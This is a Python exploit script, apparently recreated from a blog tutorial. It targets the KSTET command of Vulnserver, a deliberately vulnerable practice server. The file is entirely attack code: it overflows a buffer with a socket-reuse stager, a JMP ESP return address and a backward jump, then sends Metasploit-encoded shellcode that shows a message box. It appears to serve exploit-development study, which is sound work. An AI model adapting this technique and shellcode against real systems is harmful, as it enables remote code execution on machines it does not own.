# Inspired and recreated from https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/

import os, socket, sys, time

host = 'PUT IP ADDRESS HERE'
port = 9999

stager='\x54\x58\x66\x05\x88\x01\x83\xec'
stager+='\x64\x33\xdb\x53\x80\xc7\x04\x53'
stager+='\x54\x5b\x83\xc3\x64\x53\xff\x30'
stager+='\xb8\x90\x2c\x25\x40\xc1\xe8\x08'
stager+='\xff\xd0'


buffer='KSTET '
buffer+= stager
buffer+='\x90' * (70 - len(stager))
buffer+='\xaf\x11\x50\x62'  #JMP ESP 0x625011af
buffer+='\xeb\xb4\x90\x90'  #JMP $-70 to start of buffer at 'A'
buffer+='\x90' * 500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

s.recv(1024)
s.send(buffer)

time.sleep(5)

# msfpayload windows/messagebox title="Socket Re-Use Technique" text="Thank you, Rob." R | msfencode -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -t py

buf =  ""
buf += "\xda\xc7\xd9\x74\x24\xf4\xbe\x23\xbd\x66\xdb\x58\x29"
buf += "\xc9\xb1\x47\x31\x70\x17\x03\x70\x17\x83\xcb\x41\x84"
buf += "\x2e\xd2\x51\xd2\x08\x90\x81\x11\x9b\x8a\x78\xae\xed"
buf += "\xe3\x19\xda\x7f\xc3\x6a\xaa\x73\xa8\x1b\x4f\x07\xe8"
buf += "\xeb\xe4\x69\xd4\x60\xcc\xad\x5b\x6f\x44\x3d\x3a\x8e"
buf += "\x77\x3e\x5d\xf0\xfc\xad\xb9\xd5\x89\x6b\xfd\x9e\xda"
buf += "\x5b\x85\xa1\x08\x10\x3f\xba\x47\x7d\x9f\xbb\xbc\x61"
buf += "\xeb\xf2\xc9\x52\x98\x04\x20\xab\x61\x37\x7c\x30\x31"
buf += "\xbc\xbc\xbd\x4e\x7c\xf3\x33\x51\xb9\xe7\xb8\x6a\x39"
buf += "\xdc\x68\xf9\x20\x97\x33\x25\xa2\x43\xa5\xae\xa8\xd8"
buf += "\xa1\xea\xac\xdf\x5e\x81\xc9\x54\xa1\x7d\x58\x2e\x86"
buf += "\x61\x3a\x6c\x74\x91\x95\xa6\xf0\x44\x6c\x84\x6b\x08"
buf += "\x21\x07\x80\x46\x56\x88\xa7\x99\x59\x3e\x12\x61\x1d"
buf += "\x3f\x45\x8b\x12\x47\x69\x6f\x87\xaf\x1c\x90\xd8\xcf"
buf += "\xa8\x2b\x2f\x58\xc7\xdf\x0f\xd9\x7f\x2c\x62\xf7\x1b"
buf += "\x3a\xf7\x74\x81\xc8\x7f\x26\x6d\x26\x09\x31\x3b\xc9"
buf += "\x5c\xba\x4d\xf7\x0f\x79\xe5\x55\xe2\xc1\x71\x85\xd9"
buf += "\x6b\x96\xd4\xde\x73\x99\x7e\x50\xf9\x03\x26\xfa\x62"
buf += "\xa4\xb8\x93\x0c\x51\x64\x30\xa8\xf1\x01\x95\x67\x71"
buf += "\xa1\x80\xf3\x55\x63\x23\xaf\xfa\xe0\xd8\x7e\xde\x6e"
buf += "\x42\xa5\xf7\xe7\x98\xcd\x98\x95\x70\x56\x0f\x2c\xa1"
buf += "\x46\x9d\xa6\xd2\xa6\x58\x59\x4d\xf3\xf2\xc4\xe3\xca"
buf += "\xcb\x8e\xb0\x08\xc3\x07\xa9\x60\x09\x45\x79\xd2\xff"
buf += "\x96\xad\xe5\x3f\x38\xb1\x53\xc8"
s.send(buf + '\x90'*(1024-len(buf)))
